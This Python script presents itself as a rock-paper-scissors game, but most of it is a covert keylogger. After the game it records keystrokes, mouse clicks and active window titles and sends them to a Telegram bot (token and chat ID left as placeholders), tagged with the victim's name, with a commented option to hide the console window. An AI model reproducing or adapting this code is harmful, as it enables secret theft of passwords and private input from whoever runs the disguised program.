import asyncio
import io
import keyboard
import pygetwindow
import telegram
import time
import winreg
import threading
from pynput import mouse
import win32gui, win32con

hwnd = win32gui.GetForegroundWindow()

name = ""

def game():
    global name
    name = input("Your name here: ")
    print("OK! It's working...")
    print("1- Rock 2- Paper 3- Scissor")
    escolha = int(input("Choose: "))
    if escolha == 1:
        print(f'{name}:Rock vs Pc:Paper \n You Lose!')
    elif escolha == 2:
        print(f'{name}:Paper vs Pc:Scissor \n You Lose!')
    elif escolha == 3:
        print(f'{name}:Scissor vs Pc:Rock \n You Lose!')
    else:
        print(f'{name}:DESTRUCTION vc PC: ... \n You Win!')
    
    time.sleep(5)
    print('yey')

TOKEN = 'TOKEN_TELEGRAM_BOT'

bot = telegram.Bot(token=TOKEN)

background_thread = threading.Thread(target=keyboard.wait)
background_thread.daemon = True
background_thread.start()

#vars
key = "null"
x_m = 0
y_m = 0
but = "null"
last_app = 't'
press = False

last_click = ""
click = ""

t0 = "null"
t1 = "null"
t2 = "null"
t3 = "null"
t4 = "null"
t5 = "null"
t6 = "null"
t7 = "null"
t8 = "null"
t9 = "null"
t10 = "null"
#----

async def send():
    while True:
        app = pygetwindow.getActiveWindow().title
        global key
        def ab(k):
            global key
            global t0
            global t1
            global t2
            global t3
            global t4
            global t5
            global t6
            global t7
            global t8
            global t9
            global t10

            t10 = t9
            t9 = t8
            t8 = t7
            t7 = t6
            t6 = t5
            t5 = t4
            t4 = t3
            t3 = t2
            t2 = t1
            t1 = t0 
            t0 = k

            time.sleep(0.1)
            key = t0 + " - " + t1 + " - " + t2 + " - " + t3 + " - " + t4 + " - " + t5 + " - " + t6 + " - " + t7 + " - " + t8 + " - " + t9 + " - " + t10
            #print(key)
            global last_app

        background_thread = threading.Thread(target=keyboard.wait)
        background_thread.daemon = True
        background_thread.start()

        keyboard.on_press(lambda e: ab(e.name))
        def on_mouse_click(x, y, button, pressed):
            global but
            if pressed: 
                #print(f'Mouse clicado em ({x}, {y}) com o botão {button}')
                but = button
            global x_m
            global y_m
            global press
            x_m = x
            y_m = y
            press = pressed

            global click
            click = str(x_m) + str(y_m) + str(but) + str(press)
        mouse_listener = mouse.Listener(on_click=on_mouse_click)
        mouse_listener.start()
        global last_app
        global last_click
        if 'z' != app:
            await bot.send_message(chat_id='Chat_ID', text=f'Last App: {app} [PC: {name}]')
        if last_click != click:
            await bot.send_message(chat_id='Chat_ID', text=f'Last mouse click: {x_m}, {y_m}, {but} [PC: {name}]')
        if last_app != key:
            await bot.send_message(chat_id='Chat_ID', text=f'Last keys in keyboard: {key} [PC: {name}]')
        last_app = key
        last_click = click
        time.sleep(1)
        
game()
#comment this out if you don't want to close the prompt
# |
# |
# V
#win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
asyncio.run(send())

# show prompt
# win32gui.ShowWindow(hwnd, win32con.SW_SHOW)